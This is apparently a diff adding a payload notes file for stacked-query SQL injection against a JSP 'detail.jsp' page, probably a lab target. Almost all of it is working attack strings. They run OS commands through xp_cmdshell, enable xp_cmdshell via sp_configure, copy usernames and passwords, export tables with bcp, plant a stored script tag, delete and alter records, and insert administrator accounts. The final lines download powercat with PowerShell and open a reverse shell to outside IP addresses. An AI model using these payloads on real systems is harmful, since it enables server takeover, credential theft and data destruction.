@@ -1,0 +1,22 @@
+OS Command Execution
+	http://localhost:8080/StackedQuery/detail.jsp?id=2;EXEC xp_cmdshell 'echo hello > F:\output.txt'
+	http://localhost:8080/StackedQuery/detail.jsp?id=2;exec xp_cmdshell('echo hello > F:\\output.txt'); --
+dump 
+	http://localhost:8080/StackedQuery/detail.jsp?id=2; INSERT INTO UsersBackupTable (username, password) SELECT username, password FROM users; --
+	EXEC xp_cmdshell 'bcp "SELECT * FROM YourTableName" queryout "F:\data.txt" -c -T -S YourServerName';
+Script
+	http://localhost:8080/StackedQuery/detail.jsp?id=1;INSERT INTO Product(ID, Name, Quantity, Price)VALUES (6,'<script>alert("Test")</script>',30, 24.99); --
+SQL query (Update, Insert ,Drop..)
+	http://localhost:8080/StackedQuery/detail.jsp?id=3; UPDATE Product SET Quantity = 0 WHERE ID = 1; --
+	http://localhost:8080/StackedQuery/detail.jsp?id=1; DELETE FROM users WHERE username='user5'; --
+	http://localhost:8080/StackedQuery/detail.jsp?id=1;INSERT INTO users (username, password) VALUES ('admin', 'admin1');
+	http://localhost:8080/StackedQuery/detail.jsp?id=1;INSERT INTO users (username, password, isadmin) VALUES ('admin', 'adminpass', 1);
+	SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--
+	SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
+	
+	
+	
+	
+	http://172.21.1.251:8080/StackedQuery/detail.jsp?id=1;EXEC xp_cmdshell 'powershell -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1''); powercat -c 172.21.1.251 -p 443 -e cmd';
+	http://172.21.1.251:8080/StackedQuery/detail.jsp?id=1;EXEC xp_cmdshell 'powershell -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1''); powercat -c 192.168.222.69 -p 443 -e cmd';
+	
